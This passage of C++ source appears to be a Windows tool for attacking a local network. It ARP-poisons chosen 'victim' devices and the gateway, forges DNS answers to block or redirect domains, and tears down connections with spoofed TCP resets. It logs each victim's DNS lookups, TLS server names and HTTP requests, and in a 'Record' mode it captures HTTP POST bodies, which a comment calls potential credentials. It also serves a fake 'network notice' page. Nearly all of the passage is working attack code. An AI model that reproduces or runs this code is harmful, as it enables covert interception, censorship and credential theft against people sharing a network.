    memcpy(pseudo + 4, &dstIp, 4);
    pseudo[8] = 0; pseudo[9] = 6;
    pseudo[10] = 0; pseudo[11] = 20;
    memcpy(pseudo + 12, tcp, 20);
    uint16_t tc = checksum16(pseudo, 32);
    tcp[16] = tc >> 8; tcp[17] = tc & 0xFF;

    sendFrame(f, sizeof(f));
}

static void sendRawUdp(const unsigned char* dstMac, const unsigned char* srcMac,
                       uint32_t srcIp, uint32_t dstIp,
                       uint16_t srcPort, uint16_t dstPort,
                       const unsigned char* payload, int plen) {
    int tot = 20 + 8 + plen;
    int framelen = 14 + tot;
    std::vector<unsigned char> f(framelen, 0);

    memcpy(&f[0], dstMac, 6);
    memcpy(&f[6], srcMac, 6);
    f[12] = 0x08; f[13] = 0x00;

    unsigned char* ip = &f[14];
    ip[0] = 0x45;
    ip[2] = (tot >> 8) & 0xFF; ip[3] = tot & 0xFF;
    ip[4] = (rnd16() >> 8) & 0xFF;
    ip[5] = rnd16() & 0xFF;
    ip[6] = 0x40;
    ip[8] = 64;
    ip[9] = 17;
    memcpy(&ip[12], &srcIp, 4);
    memcpy(&ip[16], &dstIp, 4);
    uint16_t csum = checksum16(ip, 20);
    ip[10] = csum >> 8; ip[11] = csum & 0xFF;

    unsigned char* udp = ip + 20;
    udp[0] = (srcPort >> 8) & 0xFF; udp[1] = srcPort & 0xFF;
    udp[2] = (dstPort >> 8) & 0xFF; udp[3] = dstPort & 0xFF;
    int ulen = 8 + plen;
    udp[4] = (ulen >> 8) & 0xFF; udp[5] = ulen & 0xFF;
    if (ulen > 512) return;
    memcpy(udp + 8, payload, plen);

    unsigned char pseudo[12 + 8 + 512];
    memcpy(pseudo,     &srcIp, 4);
    memcpy(pseudo + 4, &dstIp, 4);
    pseudo[8] = 0; pseudo[9] = 17;
    pseudo[10] = (ulen >> 8) & 0xFF; pseudo[11] = ulen & 0xFF;
    memcpy(pseudo + 12, udp, ulen);
    uint16_t ucs = checksum16(pseudo, 12 + ulen);
    if (ucs == 0) ucs = 0xFFFF;
    udp[6] = ucs >> 8; udp[7] = ucs & 0xFF;

    sendFrame(f.data(), framelen);
}

struct DnsRule {
    std::string pattern;
    std::string action;
    std::string targetIp;
    std::string victim;
};
static std::vector<DnsRule> g_dnsRules;
static std::mutex           g_dnsRuleMutex;

struct DnsMap { std::string ip; DWORD stamp = 0; DWORD lastPoison = 0; bool announced = false; };
static std::unordered_map<std::string, DnsMap> g_victimDns;
static std::mutex                              g_victimDnsMutex;

static bool matchDnsRule(const std::string& qname, const std::string& victimIp,
                         DnsRule& hit) {
    std::string lowerQ = toLower(qname);
    std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
    for (auto& r : g_dnsRules) {
        if (r.victim != "*" && r.victim != victimIp) continue;
        std::string lp = r.pattern;
        if (!lp.empty() && lp.front() == '*') lp.erase(0, 1);
        if (!lp.empty() && lp.back()  == '*') lp.pop_back();
        lp = toLower(lp);
        if (lp.empty() || lowerQ.find(lp) != std::string::npos) {
            hit = r; return true;
        }
    }
    return false;
}

static int buildDnsAnswer(const unsigned char* query, int qlen,
                          uint32_t answerIp,
                          unsigned char* out, int outCap) {
    if (qlen < 12) return 0;
    int qdcount = (query[4] << 8) | query[5];
    if (qdcount < 1) return 0;

    int pos = 12;
    while (pos < qlen) {
        unsigned l = query[pos];
        if (l == 0) { pos++; break; }
        if ((l & 0xC0) == 0xC0) { pos += 2; break; }
        pos += 1 + (int)l;
    }
    int qEnd = pos + 4;
    if (qEnd > qlen) return 0;
    if (qEnd + 16 > outCap) return 0;

    memcpy(out, query, qEnd);
    out[2] = 0x81; out[3] = 0x80;
    out[6] = 0x00; out[7] = 0x01;
    out[8] = 0x00; out[9] = 0x00;
    out[10]= 0x00; out[11]= 0x00;

    unsigned char* ans = out + qEnd;
    ans[0]  = 0xC0; ans[1]  = 0x0C;
    ans[2]  = 0x00; ans[3]  = 0x01;
    ans[4]  = 0x00; ans[5]  = 0x01;
    ans[6]  = 0x00; ans[7]  = 0x00;
    ans[8]  = 0x00; ans[9]  = 0x1E;
    ans[10] = 0x00; ans[11] = 0x04;
    memcpy(ans + 12, &answerIp, 4);
    return qEnd + 16;
}

static int buildDnsNoData(const unsigned char* query, int qlen,
                          unsigned char* out, int outCap) {
    if (qlen < 12) return 0;
    int qdcount = (query[4] << 8) | query[5];
    if (qdcount < 1) return 0;

    int pos = 12;
    while (pos < qlen) {
        unsigned l = query[pos];
        if (l == 0) { pos++; break; }
        if ((l & 0xC0) == 0xC0) { pos += 2; break; }
        pos += 1 + (int)l;
    }
    int qEnd = pos + 4;
    if (qEnd > qlen || qEnd > outCap) return 0;

    memcpy(out, query, qEnd);
    out[2] = 0x81; out[3] = 0x80;
    out[6] = 0x00; out[7] = 0x00;   // ANCOUNT = 0  -> NODATA
    out[8] = 0x00; out[9] = 0x00;
    out[10]= 0x00; out[11]= 0x00;
    return qEnd;
}

static void killConn(const Conn& c) {
    unsigned char cmac[6] = {0}, smac[6] = {0};
    victimMac(c.cip, cmac);
    victimMac(c.sip, smac);
    if (macZero(cmac) || macZero(smac)) return;

    uint32_t cip = 0, sip = 0;
    inet_pton(AF_INET, c.cip.c_str(), &cip);
    inet_pton(AF_INET, c.sip.c_str(), &sip);

    for (int i = 0; i < 2; ++i) {
        sendTcpRst(smac, g_myMac, cip, sip, c.cport, c.sport, c.cseq, c.sack);
        sendTcpRst(cmac, g_myMac, sip, cip, c.sport, c.cport, c.sseq, c.cack);
    }
    g_kills++;

    std::string tag = c.app.empty() ? "" : (" (" + c.app + ")");
    PF("[kill] %s:%u <-> %s:%u%s\n",
       c.cip.c_str(), c.cport, c.sip.c_str(), c.sport, tag.c_str());
}

static void killMatchingConns(const std::string& app, const std::string& victim) {
    std::vector<Conn> hits;
    {
        std::lock_guard<std::mutex> lk(g_connMutex);
        for (auto& kv : g_conns) {
            const Conn& c = kv.second;
            if (!app.empty() && c.app != app) continue;
            if (victim != "*" && c.cip != victim) continue;
            hits.push_back(c);
        }
    }
    for (auto& c : hits) killConn(c);
}

static void handleDnsQuery(const char* victimIp, const char* dnsIp,
                           int victimSrcPort,
                           const unsigned char* dnsPayload, int dnsLen) {
    std::string qname;
    uint16_t qtype = 0;
    if (!dnsExtractQuery(dnsPayload, dnsLen, qname, qtype)) return;
    if (!inActivity(victimIp)) return;

    DnsRule hit;
    if (!matchDnsRule(qname, victimIp, hit)) return;
    // A and AAAA both have to be answered: if AAAA is left alone the client
    // happily uses the real IPv6 address and the block/redirect is bypassed.
    if (qtype != 1 && qtype != 28) return;

    bool needPoison = false;
    {
        std::lock_guard<std::mutex> lk(g_victimDnsMutex);
        auto& e = g_victimDns[victimIp];
        e.ip = dnsIp;
        e.stamp = GetTickCount();
        DWORD now = GetTickCount();
        if (now - e.lastPoison > DNS_REPOISON_MS) {
            e.lastPoison = now;
            needPoison = true;
        }
    }
    if (needPoison) controlDnsFor(victimIp, true);

    unsigned char reply[512];
    int rlen = 0;
    if (qtype == 28) {
        // NODATA for AAAA so the client falls back to our A answer
        rlen = buildDnsNoData(dnsPayload, dnsLen, reply, sizeof(reply));
    } else {
        uint32_t answerIp = 0;
        if (hit.action == "redirect")
            inet_pton(AF_INET, hit.targetIp.c_str(), &answerIp);
        rlen = buildDnsAnswer(dnsPayload, dnsLen, answerIp, reply, sizeof(reply));
    }
    if (rlen <= 0) return;

    unsigned char vmac[6] = {0};
    victimMac(victimIp, vmac);
    if (macZero(vmac)) return;

    in_addr sip4, dip4;
    inet_pton(AF_INET, dnsIp, &sip4);
    inet_pton(AF_INET, victimIp, &dip4);

    for (int i = 0; i < 3; ++i) {
        sendRawUdp(vmac, g_myMac,
                   sip4.S_un.S_addr, dip4.S_un.S_addr,
                   53, (uint16_t)victimSrcPort,
                   reply, rlen);
    }
    g_dnsBlocked++;
    PF("[BLOCK] %-15s %s %s -> %s\n", victimIp, qname.c_str(),
       qtype == 28 ? "(AAAA)" : "(A)",
       qtype == 28 ? "nodata"
                   : (hit.action == "block" ? "0.0.0.0" : hit.targetIp.c_str()));
}

static void controlDnsFor(const std::string& victimIp, bool force) {
    std::string dnsIp;
    {
        std::lock_guard<std::mutex> lk(g_victimDnsMutex);
        auto it = g_victimDns.find(victimIp);
        if (it == g_victimDns.end()) return;
        bool stale = (GetTickCount() - it->second.stamp > DNS_TTL_MS);
        if (stale && !force) return;
        dnsIp = it->second.ip;
    }
    unsigned char vmac[6] = {0}, dmac[6] = {0};
    if (!victimMac(victimIp, vmac) || macZero(vmac)) return;

    bool direct = getMacFromArpCache(dnsIp.c_str(), dmac) && !macZero(dmac);
    if (!direct) {
        // off-subnet resolver: the victim reaches it through the gateway, so
        // poisoning the gateway entry is what actually captures DNS traffic
        if (g_gatewayIp.empty() || macZero(g_gatewayMac)) return;
        dnsIp = g_gatewayIp;
        memcpy(dmac, g_gatewayMac, 6);
    }

    for (int i = 0; i < 3; ++i) {
        sendArp(nullptr, dnsIp.c_str(), g_myMac, vmac, victimIp.c_str(), 2);
        if (poisonGatewaySide())
            sendArp(nullptr, victimIp.c_str(), g_myMac, dmac, dnsIp.c_str(), 2);
        Sleep(15);
    }

    bool announce = false;
    {
        std::lock_guard<std::mutex> lk(g_victimDnsMutex);
        auto it = g_victimDns.find(victimIp);
        if (it != g_victimDns.end() && !it->second.announced) {
            it->second.announced = true;
            announce = true;
        }
    }
    if (announce)
        PF("[+] dns-control armed for %s (resolver=%s)\n",
           victimIp.c_str(), dnsIp.c_str());
}

// ---------------------------------------------------------------
// per-device traffic analytics (bytes, packets, protocol mix, peers)
// ---------------------------------------------------------------
static bool isVictimIp(const std::string& ip) {
    return isKnownVictimIp(ip);
}

static std::string protoLabel(int proto, int sport, int dport) {
    int p = (dport > 0) ? dport : sport;
    if (proto == 17) {
        switch (p) {
            case 53:   return "DNS";
            case 5353: return "mDNS";
            case 5355: return "LLMNR";
            case 1900: return "SSDP";
            case 67: case 68: return "DHCP";
            case 443: case 80: case 8443: case 8080: return "QUIC";
            default:   return "UDP";
        }
    }
    if (proto == 6) {
        switch (p) {
            case 443: case 8443: return "TLS";
            case 80: case 8080: case 8000: return "HTTP";
            case 22:   return "SSH";
            case 23:   return "TELNET";
            case 21:   return "FTP";
            case 25: case 587: return "SMTP";
            case 110:  return "POP3";
            case 143:  return "IMAP";
            case 445: case 139: return "SMB";
            case 3389: return "RDP";
            default:   return "TCP";
        }
    }
    if (proto == 1) return "ICMP";
    return "OTHER";
}

// ---------------------------------------------------------------
// bypass detection: QUIC, DoH/DoT and VPN traffic that dodges a plain
// DNS/HTTP MITM. Everything here is a passive, best-effort signal.
// ---------------------------------------------------------------
static bool isLanIp(const std::string& ip) {
    if (g_myIp.empty() || ip.empty()) return false;
    size_t d = g_myIp.find_last_of('.');
    if (d == std::string::npos) return false;
    return ip.compare(0, d, g_myIp, 0, d) == 0;
}

// well-known DoH / encrypted-DNS endpoint hostnames (substring, lower-case)
static bool isDohHost(const std::string& host) {
    static const char* names[] = {
        "cloudflare-dns.com", "one.one.one.one", "mozilla.cloudflare",
        "dns.google", "dns.quad9.net", "doh.opendns.com", "doh.dnssb.com",
        "dns.adguard.com", "dns.nextdns.io", "doh.cleanbrowsing.org",
        "dns.opendns.com", "doh.pub", "dnscrypt", "doh.li",
        "doh.centraleu.pi-dns.com", "doh.applied-privacy.net", nullptr
    };
    std::string h = toLower(host);
    for (int i = 0; names[i]; ++i)
        if (h.find(names[i]) != std::string::npos) return true;
    return false;
}

static void noteBypass(Activity& a, int proto, int serverPort,
                       const std::string& peer) {
    if (proto == 17) {
        if (serverPort == 443 || serverPort == 8443) a.quic++;
        else if (serverPort == 853) a.dot++;
        else if (serverPort == 53) {
            // DNS straight to a non-LAN resolver skips the router (and us)
            if (!peer.empty() && peer != g_gatewayIp && !isLanIp(peer))
                a.dnsDirect++;
        }
        else if (serverPort == 500 || serverPort == 4500 || serverPort == 1194 ||
                 serverPort == 1701 || serverPort == 51820 ||
                 serverPort == 51821) a.vpn++;
    } else if (proto == 6) {
        if (serverPort == 853) a.dot++;
        else if (serverPort == 1194 || serverPort == 1723 ||
                 serverPort == 1701 || serverPort == 5555) a.vpn++;
    } else if (proto == 47 || proto == 50 || proto == 51) {
        a.vpn++;   // GRE / ESP / AH
    }
}

// one-line summary of a device's bypass indicators with a coarse confidence
static std::string bypassText(const Activity& a) {
    std::string s;
    auto add = [&](const char* name, long n, const char* conf) {
        if (n <= 0) return;
        if (!s.empty()) s += "  ";
        s += std::string(name) + "(" + conf + "," + std::to_string(n) + ")";
    };
    add("QUIC", a.quic, a.quic >= 20 ? "high" : "low");
    add("DoH",  a.doh,  "high");
    add("DoT",  a.dot,  "high");
    add("VPN",  a.vpn,  a.vpn >= 20 ? "medium" : "low");
    add("directDNS", a.dnsDirect, "medium");
    return s;
}

// attribute one IPv4 packet to the device(s) it belongs to. Only devices that
// are already tracked (or scanned targets) get an entry, so the table does not
// fill with hosts we never selected.
static void accountPacket(const std::string& src, const std::string& dst,
                          unsigned len, int proto, int sport, int dport) {
    std::string label = protoLabel(proto, sport, dport);
    bool sKnown = isVictimIp(src);
    bool dKnown = isVictimIp(dst);
    std::lock_guard<std::mutex> lk(g_activityMutex);
    auto touch = [&](const std::string& ip, bool known, bool up,
                     const std::string& peer) {
        auto it = g_activity.find(ip);
        if (it == g_activity.end()) {
            if (!known) return;
            Activity a; a.ip = ip; a.lastSeen = GetTickCount();
            it = g_activity.emplace(ip, std::move(a)).first;
        }
        Activity& a = it->second;
        a.lastSeen = GetTickCount();
        if (up) { a.byUp += len; a.pktUp++; } else { a.byDown += len; a.pktDown++; }
        a.proto[label]++;
        if (!peer.empty()) a.peers[peer]++;
        // the client's view of the flow: when this device is the sender the
        // remote port is dport, otherwise it is sport
        noteBypass(a, proto, up ? dport : sport, peer);
    };
    touch(src, sKnown, true,  dst);
    touch(dst, dKnown, false, src);
}

static void classifyPacket(const unsigned char* p, int caplen) {
    if (caplen < 34) return;
    if (p[12] != 0x08 || p[13] != 0x00) return;
    const unsigned char* ip = p + 14;
    int ihl = (ip[0] & 0x0F) * 4;
    if (ihl < 20 || 14 + ihl > caplen) return;
    unsigned tot = ((unsigned)ip[2] << 8) | ip[3];
    if (tot < (unsigned)ihl || 14 + (int)tot > caplen) tot = caplen - 14;
    int proto = ip[9];

    char src[16], dst[16];
    snprintf(src, 16, "%u.%u.%u.%u", ip[12], ip[13], ip[14], ip[15]);
    snprintf(dst, 16, "%u.%u.%u.%u", ip[16], ip[17], ip[18], ip[19]);

    char macbuf[24];
    snprintf(macbuf, sizeof(macbuf), "%02X:%02X:%02X:%02X:%02X:%02X",
             p[6], p[7], p[8], p[9], p[10], p[11]);

    // never treat our own machine as a tracked device
    if (!g_myIp.empty() && g_myIp == src) return;

    // ---- per-device traffic analytics --------------------------------
    {
        int sport = -1, dport = -1;
        if (proto == 17 && ihl + 8 <= (int)tot) {
            const unsigned char* u = ip + ihl;
            sport = (u[0] << 8) | u[1];
            dport = (u[2] << 8) | u[3];
        } else if (proto == 6 && ihl + 20 <= (int)tot) {
            const unsigned char* t = ip + ihl;
            sport = (t[0] << 8) | t[1];
            dport = (t[2] << 8) | t[3];
        }
        accountPacket(src, dst, tot, proto, sport, dport);
    }

    if (proto == 17 && ihl + 8 <= (int)tot) {
        const unsigned char* udp = ip + ihl;
        int sport = (udp[0] << 8) | udp[1];
        int dport = (udp[2] << 8) | udp[3];
        int ulen  = (udp[4] << 8) | udp[5];
        if (ulen < 8) return;
        if (ihl + ulen > (int)tot) ulen = tot - ihl;
        const unsigned char* payload = udp + 8;
        int plen = ulen - 8;

        if (dport == 53 && plen > 12) {
            std::string q; uint16_t qtype = 0;
            if (dnsExtractQuery(payload, plen, q, qtype)) {
                {
                    std::lock_guard<std::mutex> lk(g_activityMutex);
                    g_activity[src].dnsCount++;
                }
                const char* t = (qtype == 1) ? "A" : (qtype == 28) ? "AAAA"
                              : (qtype == 5) ? "CNAME" : (qtype == 15) ? "MX"
                              : (qtype == 16) ? "TXT" : "?";
                trackEvent(src, macbuf, "DNS", q + " (" + t + ")");
                std::string app = appForHost(q);
                if (!app.empty()) trackedAppSeen(src, app);
                handleDnsQuery(src, dst, sport, payload, plen);
            }
        }

        // mDNS / LLMNR queries are common even when a device uses encrypted
        // DNS for the internet, so they make the timeline useful in practice
        if ((dport == 5353 || dport == 5355) && plen > 12) {
            std::string q; uint16_t qtype = 0;
            if (dnsExtractQuery(payload, plen, q, qtype)) {
                {
                    std::lock_guard<std::mutex> lk(g_activityMutex);
                    g_activity[src].dnsCount++;
                }
                trackEvent(src, macbuf, dport == 5353 ? "mDNS" : "LLMNR", q);
            }
        }

        // SSDP discovery/notify (UDP 1900): devices broadcast services here
        // every few seconds, which is very visible in the timeline
        if ((sport == 1900 || dport == 1900) && plen > 0) {
            char line[160] = {0};
            int k = 0;
            for (; k < plen && k < (int)sizeof(line) - 1; ++k) {
                char c = (char)payload[k];
                if (c == '\r' || c == '\n') break;
                line[k] = c;
            }
            line[k] = 0;
            if (k > 0 && dport == 1900) {
                const char* kind = (strncmp(line, "M-SEARCH", 8) == 0)
                                 ? "SSDP-SEARCH" : "SSDP";
                trackEvent(src, macbuf, kind, line);
            }
        }

        // DHCP requests: shows address refreshes in the timeline.
        // DISCOVER/early-REQUEST packets come from 0.0.0.0, so skip those
        // (they cannot be attributed to a device by IP).
        if (dport == 67 && plen > 240 && strcmp(src, "0.0.0.0") != 0)
            trackEvent(src, macbuf, "DHCP", "request");

        // ---- passive name learning (always on, attack or not) ----------
        if (plen > 12) {
            if (sport == 53 || sport == 5353 || sport == 5355 ||
                dport == 5353 || dport == 5355)
                learnFromDns(payload, plen);
            if (sport == 137) {
                std::string nm = parseNbstat(payload, plen);
                if (!nm.empty()) setNameForIp(src, nm, 4);
            }
            // DHCP client requests (68 -> 67) carry option 12/81 too; the
            // server does not always echo them, so parse both directions
            if (sport == 67 || dport == 67 || sport == 68 || dport == 68)
                learnFromDhcp(payload, plen, macbuf);
            if (sport == 3702 || dport == 3702)
                learnFromWsDiscovery(payload, plen, src, macbuf);
        }
    }
    else if (proto == 6 && ihl + 20 <= (int)tot) {
        const unsigned char* tcp = ip + ihl;
        int thl = ((tcp[12] >> 4) & 0xF) * 4;
        if (thl < 20) return;
        if (ihl + thl > (int)tot) return;
        int plen = tot - ihl - thl;
        if (plen < 4) return;
        const unsigned char* payload = tcp + thl;

        uint16_t sport = (tcp[0] << 8) | tcp[1];
        uint16_t dport = (tcp[2] << 8) | tcp[3];
        uint32_t seq   = ((uint32_t)tcp[4] << 24) | ((uint32_t)tcp[5] << 16) |
                         ((uint32_t)tcp[6] << 8)  |  (uint32_t)tcp[7];
        uint32_t ack   = ((uint32_t)tcp[8] << 24) | ((uint32_t)tcp[9] << 16) |
                         ((uint32_t)tcp[10] << 8) |  (uint32_t)tcp[11];
        uint8_t  flags = tcp[13];

        bool sIn = inActivity(src);
        bool dIn = inActivity(dst);
        if (sIn || dIn) {
            std::string cip, sip;
            uint16_t cport = 0, sport2 = 0;
            bool fromClient = true;
            if (sIn && !dIn)      { cip = src; cport = sport;  sip = dst; sport2 = dport;  fromClient = true;  }
            else if (dIn && !sIn) { cip = dst; cport = dport;  sip = src; sport2 = sport;  fromClient = false; }
            else                  { cip = src; cport = sport;  sip = dst; sport2 = dport;  fromClient = true;  }
            updateConn(cip, cport, sip, sport2, fromClient,
                       seq, ack, flags, plen, "");
        }

        if (payload[0] == 0x16 && plen > 5) {
            std::string sni;
            if (tlsExtractSni(payload, plen, sni)) {
                {
                    std::lock_guard<std::mutex> lk(g_activityMutex);
                    g_activity[src].sniCount++;
                    if (isDohHost(sni)) g_activity[src].doh++;
                }
                if (isDohHost(sni))
                    trackEvent(src, macbuf, "DoH", sni + "  (encrypted DNS)");
                trackEvent(src, macbuf, "SNI", sni);
                std::string app = appForHost(sni);
                if (!app.empty() && inActivity(src)) {
                    trackedAppSeen(src, app);
                    updateConn(src, sport, dst, dport, true,
                               seq, ack, flags, plen, app);
                    if (appBlocked(app, src)) {
                        bool have = false;
                        Conn snap;
                        {
                            std::lock_guard<std::mutex> lk(g_connMutex);
                            auto it = g_conns.find(connKey(src, sport, dst, dport));
                            if (it != g_conns.end()) { snap = it->second; have = true; }
                        }
                        if (have) killConn(snap);
                    }
                }
            }
        }
        else {
            auto isPrefix = [&](const char* m) {
                size_t n = strlen(m);
                return plen >= (int)n && memcmp(payload, m, n) == 0;
            };
            if (isPrefix("GET ") || isPrefix("POST ") || isPrefix("HEAD ") ||
                isPrefix("PUT ") || isPrefix("DELETE ") || isPrefix("OPTIONS ")) {
                std::string s((const char*)payload, plen);
                size_t sp1 = s.find(' '), sp2 = (sp1 == std::string::npos)
                    ? std::string::npos : s.find(' ', sp1 + 1);
                if (sp2 != std::string::npos) {
                    std::string method = s.substr(0, sp1);
                    std::string url    = s.substr(sp1 + 1, sp2 - sp1 - 1);
                    size_t hp = s.find("Host:");
                    if (hp == std::string::npos) hp = s.find("host:");
                    std::string host;
                    if (hp != std::string::npos) {
                        size_t he = s.find("\r\n", hp);
                        host = s.substr(hp + 5,
                            (he == std::string::npos ? s.size() : he) - (hp + 5));
                        while (!host.empty() && host.front() == ' ') host.erase(0, 1);
                        while (!host.empty() && host.back()  == '\r') host.pop_back();
                    }
                    {
                        std::lock_guard<std::mutex> lk(g_activityMutex);
                        g_activity[src].httpCount++;
                        if (url.find("/dns-query") != std::string::npos ||
                            isDohHost(host))
                            g_activity[src].doh++;
                    }
                    trackEvent(src, macbuf, "HTTP", method + " " + host + url);
                    // in Record mode, also capture POST body (potential credentials)
                    if (g_mode == MODE_RECORD && method == "POST") {
                        size_t bodyPos = s.find("\r\n\r\n");
                        if (bodyPos != std::string::npos) {
                            std::string body = s.substr(bodyPos + 4);
                            // trim trailing nulls/spaces
                            while (!body.empty() && (body.back() == '\0' || body.back() == '\r' || body.back() == '\n')) body.pop_back();
                            if (!body.empty() && body.size() < 500)
                                trackEvent(src, macbuf, "POST-DATA", body);
                        }
                    }
                    std::string app = appForHost(host);
                    if (!app.empty() && inActivity(src)) {
                        trackedAppSeen(src, app);
                        updateConn(src, sport, dst, dport, true,
                                   seq, ack, flags, plen, app);
                    }
                }
            }
        }
    }
}

static void handleArp(const unsigned char* p, int caplen) {
    if (caplen < 42) return;
    if (p[12] != 0x08 || p[13] != 0x06) return;
    int op = (p[20] << 8) | p[21];
    if (op != 1 && op != 2) return;

    const unsigned char* senderMac = p + 22;
    if (macEq(senderMac, g_myMac)) return;

    char sip[16];
    snprintf(sip, sizeof(sip), "%d.%d.%d.%d", p[28], p[29], p[30], p[31]);
    std::string senderIp = sip;
    std::string mac = macToString(senderMac);

    if (senderIp == g_myIp) return;
    if (senderIp == g_gatewayIp) {
        // the gateway moved to a new MAC (reboot, failover, or a router swap).
        // Keep poisoning against the new one instead of advertising a stale
        // mapping that would black-hole every victim.
        if (!macZero(g_gatewayMac) && !macEq(g_gatewayMac, senderMac)) {
            g_gwMacChanges++;
            PF("[!] gateway MAC changed: %s -> %s (re-poisoning)\n",
               macToString(g_gatewayMac).c_str(), mac.c_str());
            g_repoisonNow = true;
        }
        memcpy(g_gatewayMac, senderMac, 6);
        return;
    }

    if (op == 2) {
        if (learnVictim(senderIp, mac))
            PF("[+] new host: %-15s %s\n", senderIp.c_str(), mac.c_str());
        g_arpReplies++;
    } else {
        learnVictim(senderIp, mac);
    }

    // A selected target that is (re)resolving ARP is about to clobber our
    // poison with the real mapping. Schedule a prompt re-poison; the sweeper
    // owns the actual send so we never race the capture thread. Rate-limited
    // so a chatty host cannot turn into a packet storm.
    if (attackOn) {
        bool sel = false;
        {
            std::lock_guard<std::mutex> lk(g_vmutex);
            for (auto& v : g_victims)
                if (v.ip == senderIp && v.sel) { sel = true; break; }
        }
        if (sel) {
            DWORD t = GetTickCount();
            if (t - (DWORD)g_lastRepoison.load() > 500) {
                g_lastRepoison = (long)t;
                g_repoisonNow = true;
            }
        }
    }
}

static std::atomic<bool> g_sweeperRun{false};

static void sweeperLoop() {
    DWORD lastRep     = 0;
    DWORD lastPrune   = 0;
    DWORD lastNames   = GetTickCount();
    DWORD lastSnapRef = 0;
    while (g_sweeperRun) {
        DWORD now = GetTickCount();
        // keep the O(1) track set in sync even if some path forgot to refresh
        if (now - lastSnapRef > 4000) {
            lastSnapRef = now;
            std::lock_guard<std::mutex> lk(g_vmutex);
            refreshVictimIpSnapLocked();
        }
        std::vector<Conn> killList;
        {
            std::lock_guard<std::mutex> lk(g_connMutex);
            for (auto it = g_conns.begin(); it != g_conns.end(); ) {
                Conn& c = it->second;
                if (now - c.last > CONN_IDLE_MS) { it = g_conns.erase(it); continue; }
                if (!c.app.empty() && appBlocked(c.app, c.cip))
                    killList.push_back(c);
                ++it;
            }
        }
        for (auto& c : killList) killConn(c);

        DWORD repMs = g_sweepMs.load();
        if (repMs == 0) repMs = ARP_REPOISON_MS;
        bool urgentRep = g_repoisonNow.exchange(false);
        if (attackOn && (now - lastRep > repMs || urgentRep)) {
            lastRep = now;
            g_repoisons++;
            std::vector<Victim> snap;
            {
                std::lock_guard<std::mutex> lk(g_vmutex);
                for (auto& v : g_victims) if (v.sel) snap.push_back(v);
            }
            unsigned char gwMac[6];
            { memcpy(gwMac, g_gatewayMac, 6); }   // snapshot; may change mid-loop
            for (auto& v : snap) {
                unsigned char vmac[6] = {0};
                parseMac(v.mac, vmac);
                if (macZero(vmac)) continue;
                sendArp(nullptr, g_gatewayIp.c_str(), g_myMac, vmac, v.ip.c_str(), 2);
                if (poisonGatewaySide() && !macZero(gwMac))
                    sendArp(nullptr, v.ip.c_str(), g_myMac, gwMac,
                            g_gatewayIp.c_str(), 2);
            }
        }

        if (now - lastPrune > 60000) {
            lastPrune = now;
            std::string focus;
            { std::lock_guard<std::mutex> flk(g_focusMutex); focus = g_focusIp; }
            std::vector<std::string> pruned;
            {
                std::lock_guard<std::mutex> lk(g_activityMutex);
                for (auto it = g_activity.begin(); it != g_activity.end(); ) {
                    bool idle = it->second.lastSeen &&
                                now - it->second.lastSeen > ACTIVITY_TTL_MS;
                    if (idle && it->first != focus) {
                        if (it->second.capFile) fclose(it->second.capFile);
                        pruned.push_back(it->first);
                        it = g_activity.erase(it);
                    } else {
                        ++it;
                    }
                }
            }
            for (auto& ip : pruned) closeTrackFile(ip);
        }

        // periodically retry the devices that still have no name, so the list
        // keeps filling in without the operator clicking Resolve Names
        if (g_autoNames && !g_scanning && (now - lastNames > 90000)) {
            lastNames = now;
            int unnamed = 0;
            {
                std::lock_guard<std::mutex> lk(g_vmutex);
                for (auto& v : g_victims) if (v.name.empty()) unnamed++;
            }
            if (unnamed > 0 && !g_namesBusy.exchange(true)) {
                std::thread([]() {
                    resolveNames();
                    g_namesBusy = false;
                }).detach();
            }
        }
        Sleep(400);
    }
}

static std::mutex                                    g_msgMutex;
static std::string                                   g_globalMessage;
static std::unordered_map<std::string, std::string>  g_victimMessage;

static std::atomic<bool> g_portalRun{false};
static std::atomic<bool> g_portalActive{false};

static std::string htmlEscape(const std::string& s) {
    std::string o;
    o.reserve(s.size() + 16);
    for (char c : s) {
        switch (c) {
            case '&':  o += "&amp;";  break;
            case '<':  o += "&lt;";   break;
            case '>':  o += "&gt;";   break;
            case '"':  o += "&quot;"; break;
            case '\'': o += "&#39;";  break;
            default:   o += c;        break;
        }
    }
    return o;
}

static std::string buildPortalPage(const std::string& msg) {
    std::ostringstream o;
    o << "<!doctype html><html><head><meta charset='utf-8'>"
         "<meta name='viewport' content='width=device-width,initial-scale=1'>"
         "<title>Network notice</title><style>"
         "html,body{margin:0;height:100%;background:#0b0b0d;color:#eee;"
         "font:16px/1.6 system-ui,Segoe UI,Roboto,sans-serif}"
         ".w{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}"
         ".c{max-width:640px;background:#16161a;border:1px solid #26262c;"
         "border-radius:14px;padding:28px 32px;box-shadow:0 10px 40px rgba(0,0,0,.6)}"
         "h1{margin:0 0 10px;font-size:17px;letter-spacing:.5px;color:#8fd0ff;font-weight:600}"
         "p{margin:0;white-space:pre-wrap;word-wrap:break-word;color:#ddd}"
         ".f{margin-top:18px;font-size:12px;color:#6a6a75;letter-spacing:.4px}"
         "</style></head><body><div class='w'><div class='c'>"
         "<h1>Network notice</h1><p>"
      << htmlEscape(msg)
      << "</p><div class='f'>delivered by your network operator</div>"
         "</div></div></body></html>";
    return o.str();
}

static void respondPortal(SOCKET s, const std::string& clientIp) {
    DWORD tv = 500;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(tv));
    char buf[4096];
    recv(s, buf, sizeof(buf), 0);

    std::string msg;
    {
        std::lock_guard<std::mutex> lk(g_msgMutex);
        auto it = g_victimMessage.find(clientIp);
        if (it != g_victimMessage.end() && !it->second.empty()) msg = it->second;
        else                                                    msg = g_globalMessage;
    }
    std::string body = buildPortalPage(msg.empty() ? "(no active message)" : msg);

    char hdr[384];
    snprintf(hdr, sizeof(hdr),
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=utf-8\r\n"
        "Content-Length: %zu\r\n"
        "Cache-Control: no-store, no-cache, must-revalidate\r\n"
        "Connection: close\r\n\r\n",
        body.size());
    send(s, hdr, (int)strlen(hdr), 0);
    send(s, body.data(), (int)body.size(), 0);
    closesocket(s);
}

// name the process that is holding a TCP port so a failed portal bind is
// actionable instead of a mystery
static std::string tcpListenerOwner(int port) {
    DWORD size = 0;
    GetExtendedTcpTable(nullptr, &size, FALSE, AF_INET,
                        TCP_TABLE_OWNER_PID_LISTENER, 0);
    if (size == 0) return "";
    std::vector<unsigned char> buf(size);
    auto* t = (PMIB_TCPTABLE_OWNER_PID)buf.data();
